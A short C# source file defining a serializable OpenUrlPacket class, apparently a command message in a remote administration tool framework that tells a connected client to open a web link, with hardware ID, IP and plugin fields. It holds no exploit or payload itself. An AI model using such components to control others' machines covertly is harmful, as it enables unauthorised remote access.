using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class OpenUrlPacket : IPacket
    {
        public OpenUrlPacket(string url) : base()
        {
            this.PacketType = PacketType.MISC_OPEN_WEBSITE_LINK;
            this.url = url;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public string url { get; set; }
    }
}
